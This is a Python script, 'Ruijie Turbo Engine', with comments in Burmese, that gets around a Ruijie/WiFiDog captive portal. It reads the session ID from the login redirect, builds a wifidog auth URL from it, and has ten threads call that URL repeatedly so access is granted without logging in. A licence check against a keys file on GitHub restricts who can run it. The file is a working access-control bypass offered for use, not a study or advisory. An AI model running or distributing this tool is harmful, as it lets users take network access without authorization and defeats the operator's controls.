import requests, re, urllib3, time, threading, random, os, sys
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

# SSL Warning ပိတ်ရန်
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# 🌐 GITHUB REMOTE CONFIG
# ===============================
GITHUB_USER = "tmmt6132-coder"
REPO_NAME = "Bypass"
URL_TO_KEYS = f"https://raw.githubusercontent.com/{GITHUB_USER}/{REPO_NAME}/main/keys.txt"

def get_system_id():
    try:
        import hashlib
        combined = str(os.getuid()) + os.environ.get('USER', 'unknown')
        return hashlib.md5(combined.encode()).hexdigest()[:10].upper()
    except:
        return "GET-ID-ERR"

def check_remote_approval():
    os.system('clear' if os.name == 'posix' else 'cls')
    sys_id = get_system_id()
    print(f"\033[95m╔════════════════════════════════════════╗\n║       TURBO ENGINE ACCESS CONTROL      ║\n╚════════════════════════════════════════╝\033[0m")
    print(f"\n[📡] Your System ID: \033[92m{sys_id}\033[0m")
    
    try:
        t_buster = f"?t={int(time.time())}"
        response = requests.get(URL_TO_KEYS + t_buster, timeout=10)
        if response.status_code != 200: return False
        
        lines = response.text.strip().splitlines()
        for line in lines:
            line = line.strip()
            if "," not in line or line.startswith("#"): continue
            parts = line.split(',')
            allowed_id, exp_str = line.split(',')
            if sys_id == allowed_id.strip():
                if datetime.now() < datetime.strptime(exp_str.strip(), '%Y-%m-%d'):
                    print(f"\033[92m[✓] ACCESS GRANTED! (Expires: {exp_str})\033[0m")
                    time.sleep(1)
                    return True
        return False
    except: return False

# ===============================
# 🚀 CORE ENGINE LOGIC
# ===============================

def turbo_ping(auth_link):
    """Background pulse threads"""
    while True:
        try:
            requests.get(auth_link, timeout=5, verify=False)
        except: pass
        time.sleep(0.05)

def start_bypass():
    os.system('clear')
    print(f"\033[96m" + "="*40 + "\n   🚀 RUIJIE TURBO ENGINE v2.5 ACTIVE\n" + "="*40 + "\033[0m")
    
    test_url = "http://connectivitycheck.gstatic.com/generate_204"
    
    while True:
        try:
            print(f"\r\033[90m[*] Monitoring Network Status...\033[0m", end="")
            r = requests.get(test_url, allow_redirects=True, timeout=5)
            
            # အကယ်၍ Login Page သို့ ရောက်သွားပါက
            if r.url != test_url:
                print(f"\n\n\033[93m[!] Captive Portal Found!\033[0m")
                print(f"\033[94m[*] Redirected to: {r.url[:50]}...\033[0m")
                
                # SID နဲ့ Gateway ရှာဖွေခြင်း
                parsed = urlparse(r.url)
                params = parse_qs(parsed.query)
                
                gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
                gw_port = params.get('gw_port', ['2060'])[0]
                sid = params.get('sessionId', [None])[0]
                
                if not sid:
                    sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r.url)
                    sid = sid_match.group(1) if sid_match else "NONE"
                
                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"
                
                print(f"\033[92m[✓] Captured SID: {sid}\033[0m")
                print(f"\033[35m[*] Turbo Engine Launching 10 Threads...\033[0m")
                
                # အားကောင်းအောင် Thread ၁၀ ခုနဲ့ ချိတ်ဆက်မှုထိန်းခြင်း
                for _ in range(10):
                    t = threading.Thread(target=turbo_ping, args=(auth_link,), daemon=True)
                    t.start()
                
                print(f"\033[92m[✓] Bypass Active! Keep this screen open.\033[0m\n")
                
                # Internet ရနေသရွေ့ ဒီနေရာမှာ စောင့်နေမယ်
                while True:
                    try:
                        if requests.get(test_url, timeout=5).status_code == 204:
                            print(f"\r\033[0;32m[✓]\033[0m Connection Stable | Turbo Pings Active...", end="")
                            time.sleep(10)
                        else:
                            break
                    except:
                        break
            
            time.sleep(5)
        except KeyboardInterrupt:
            print(f"\n\033[91m[!] Engine Stopped.\033[0m"); break
        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    if check_remote_approval():
        start_bypass()
    else:
        print(f"\n\033[91m[!] Not Authorized. Contact Admin.\033[0m")
        sys.exit()
        
